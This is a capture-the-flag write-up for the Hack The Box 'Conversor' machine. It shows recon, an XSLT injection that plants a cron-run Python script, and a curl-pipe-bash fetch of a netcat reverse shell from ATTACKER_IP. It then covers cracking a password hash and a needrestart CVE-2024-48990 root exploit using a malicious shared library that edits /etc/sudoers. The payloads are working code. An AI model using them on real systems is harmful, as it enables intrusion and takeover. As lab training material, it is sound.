---
title: 'Conversor — Writeup'
author: n0l1v3sm4tt3r
categories: [HTB]
tags: [xslt, xml, reverse-shell, cron, exploit]
media_subpath: /images/htb-conversor/
image:
  path: logo.png
---

## Machine info
> **Name**: Conversor  
> **Difficulty**: Easy  
> **IP**: 10.129.122.45

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Analyzing the Source Code](#analyzing-the-source-code)
3. [Exploiting the Application](#exploiting-the-application)
4. [Horizontal privilege escalation](#horizontal-privilege-escalation)
5. [fismathack to root](#fismathack-to-root)

## Initial Reconnaissance

### Nmap Scan

```bash
mkdir nmap;nmap -A -T5 -Pn 10.129.122.45 -oN nmap/basic.txt
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   89.33 ms 10.10.14.1
2   90.77 ms 10.129.122.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
```

**Open Ports Summary:**

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

---

### Directory Enumeration with Gobuster

> Note: Accessing `http://10.129.122.45` redirects to `http://conversor.htb`. Add this domain to `/etc/hosts`.

```bash
mkdir gobuster;gobuster dir -u http://conversor.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -o gobuster/main_domain.txt
```

**Output:**

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://conversor.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/login                (Status: 200) [Size: 722]
/logout               (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 726]
/server-status        (Status: 403) [Size: 278]
Progress: 14238 / 14238 (100.00%)
===============================================================
Finished
===============================================================
```

---

## Analyzing the Source Code

The `/about` page allows downloading the application source code. After decompressing:

```bash
tar -xf source_code.tar.gz
```

Inside, the `install.md` file mentions a cron job:

```text
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Observation:** Any Python script uploaded to `/var/www/conversor.htb/scripts/` will run every minute. This is key for remote code execution.

---

## Exploiting the Application

Create a malicious XSLT payload (`payload.xslt`) to write a Python script on the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:payload="http://exslt.org/common" extension-element-prefixes="payload">
<xsl:template match="/">
<payload:document href="/var/www/conversor.htb/scripts/payload.py" method="text">
import os
os.system("curl http://<ATTACKER_IP>:8000/shell.sh | bash")
</payload:document>
</xsl:template>
</xsl:stylesheet>
```

* Serve a reverse-shell script (`shell.sh`) on your attacker machine:

```bash
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

* Upload the payload by submitting XML (e.g., Nmap XML scan) to the web application.
* Set up a Netcat listener:

```bash
nc -nlvp <ATTACKER_PORT>
```

* After one minute, you get a shell. Spawn a proper TTY:
![Webserver callback](webserv-callback.png)
![netcat callback](netcat-callback.png)

```bash
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Horizontal privilege escalation

Check the SQLite database (`instance` folder):

```console
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
files  users
sqlite> SELECT * FROM users;
SELECT * FROM users;
1|fismathack|REDACTED
sqlite> .exit
```

Retrieve the password hash, crack it (e.g., with [CrackStation](https://crackstation.net)), then SSH as `fismathack`.

![crackstation](crackstation.png)
![ssh](ssh.png)

---

## fismathack to root

Check sudo permissions:

```console
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

* I checked the needrestart version by running `sudo /usr/sbin/needrestart`  

```console
fismathack@conversor:~$ sudo /usr/sbin/needrestart --help
needrestart 3.7 - Restart daemons after library updates.

(...)
```

**Observation:** `needrestart` can be exploited (CVE-2024-48990). Since `gcc` is missing on the target, compile the exploit locally.

---

### Exploit Setup

I based my exploitation on this [PoC](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)

> **Reminder**: gcc is not on the victim server, so I need to compile the exploit on my attacker machine

- Create `lib.c` for the malicious shared library:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; chmod u+s /tmp/poc; echo 'ALL ALL=NOPASSWD: /tmp/poc' >> /etc/sudoers";
        system(shell);
    }
}
```

- Compile:

```bash
x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c
```

- Transfer `__init__.so` to the target and prepare the Python trigger script (`runner.sh`):

```bash
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib
curl http://<ATTACKER_IP>:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

- Run `runner.sh` in your current ssh session
```bash
bash runner.sh
```

- Trigger the exploit (in a new ssh session as `fismathack`):

```bash
sudo /usr/sbin/needrestart
```

Go back in your `runner.sh` ssh session and you obtained the root shell

![root](root.png)

---